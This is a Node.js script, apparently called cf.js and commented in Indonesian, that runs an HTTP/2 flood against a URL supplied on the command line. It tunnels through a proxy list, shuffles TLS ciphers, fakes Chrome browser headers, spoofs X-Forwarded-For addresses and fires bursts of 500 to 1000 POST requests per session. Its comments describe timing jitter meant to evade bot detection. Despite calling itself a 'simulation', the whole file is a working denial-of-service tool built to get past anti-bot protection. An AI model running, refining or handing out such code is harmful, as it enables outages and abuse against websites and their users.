const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const fs = require('fs'); 
const url_module = require('url');
const crypto = require('crypto');

process.on('uncaughtException', (err) => { });
process.on('unhandledRejection', (reason, promise) => { });

if (process.argv.length < 6) {
    console.log(`Penggunaan: node cf.js <URL> <Waktu> <Rate> <Threads> <ProxyFile>`);
    process.exit(-1);
}

const targetUrl = process.argv[2];
const duration = Number(process.argv[3]);
const totalThreads = Number(process.argv[5]);
const proxyFile = process.argv[6] || 'proxies.txt';
const parsedTarget = url_module.parse(targetUrl);

let activeSessions = [];
let stats = { success: 0, blocked: 0, rateLimited: 0, errors: 0 };

const rIp = () => `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
const rStr = (l) => crypto.randomBytes(Math.ceil(l / 2)).toString('hex').slice(0, l);

const userAgents = [
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', plat: '"Windows"' },
    { ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', plat: '"macOS"' }
];

const acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8,en;q=0.7', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'];

let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);

const shuffleCiphers = () => ['TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256', 'ECDHE-ECDSA-AES128-GCM-SHA256'].sort(() => Math.random() - 0.5).join(':');

setInterval(() => {
    console.clear();
    const uptime = process.uptime();
    console.log(`[High-Speed HTTP/2 Simulation]`);
    console.log(`[Target] ${targetUrl}`);
    console.log(`[Stats] Success: ${stats.success} | 403: ${stats.blocked} | 429: ${stats.rateLimited} | Errors: ${stats.errors}`);
    console.log(`[Perf] RPS: ${Math.floor(stats.success / uptime)} | Active Sessions: ${activeSessions.length}`);
}, 1000);

function createSession() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const [pHost, pPort] = proxy.split(':');
    const selectedUA = userAgents[Math.floor(Math.random() * userAgents.length)];

    const socket = net.connect(Number(pPort), pHost);
    socket.setNoDelay(true);
    socket.setKeepAlive(true, 120000);

    socket.once('connect', () => {
        socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

        socket.once('data', (data) => {
            if (!data.toString().includes('200')) { socket.destroy(); return; }

            const tlsSocket = tls.connect({
                socket: socket,
                servername: parsedTarget.host,
                ciphers: shuffleCiphers(),
                ALPNProtocols: ['h2'],
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION
            }, () => {
                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsSocket,
                    settings: { 
                        enablePush: false, 
                        initialWindowSize: 33554432, // 32MB window
                        maxConcurrentStreams: 5000,
                        headerTableSize: 65536,
                        maxFrameSize: 16384
                    }
                });

                activeSessions.push(client);

                client.on('remoteSettings', () => {
                    // SUPER BURST: 500-1000 request
                    const burstAmount = Math.floor(Math.random() * (1000 - 500 + 1)) + 500; 
                    
                    for (let j = 0; j < burstAmount; j++) {
                        // Human Strategy: Random delay per request dalam milidetik (0-15ms)
                        // agar tidak terlihat seperti 1 snapshot paket yang sama (de-sync)
                        setTimeout(() => {
                            if (client.destroyed) return;

                            const postData = JSON.stringify({ 
                                session_key: rStr(16), 
                                trace_id: crypto.randomUUID(),
                                interaction_time: Math.floor(Math.random() * 5000)
                            });
                            
                            const req = client.request({
                                ':method': 'POST',
                                ':path': parsedTarget.path + (Math.random() > 0.7 ? `?_t=${Date.now()}` : ''),
                                ':authority': parsedTarget.host,
                                ':scheme': 'https',
                                'user-agent': selectedUA.ua,
                                'accept': 'application/json, text/plain, */*',
                                'accept-language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
                                'content-type': 'application/json',
                                'content-length': Buffer.byteLength(postData),
                                'sec-ch-ua': selectedUA.brand,
                                'sec-ch-ua-platform': selectedUA.plat,
                                'sec-fetch-mode': 'cors',
                                'sec-fetch-site': 'same-origin',
                                'sec-fetch-dest': 'empty',
                                'x-requested-with': 'XMLHttpRequest', // Human-like AJAX header
                                'referer': targetUrl,
                                'x-forwarded-for': rIp(),
                                'priority': 'u=1, i'
                            });

                            req.on('response', (headers) => {
                                const status = headers[':status'];
                                if (status == 200) stats.success++;
                                else if (status == 403) stats.blocked++;
                                else if (status == 429) stats.rateLimited++;
                                if (status >= 400) client.destroy();
                            });

                            req.on('error', () => { stats.errors++; req.destroy(); });
                            req.write(postData);
                            req.end();
                        }, j * 0.2); // Micro-jittering (0.2ms interval)
                    }
                });

                client.on('error', () => { stats.errors++; client.destroy(); });
            });
        });
    });
}

// Threading Control
for (let i = 0; i < totalThreads; i++) {
    // Membuka sesi baru lebih cepat untuk throughput maksimal
    setInterval(createSession, 300); 
}

setTimeout(() => {
    console.log(`\n[System] Simulasi selesai.`);
    process.exit(0);
}, duration * 1000);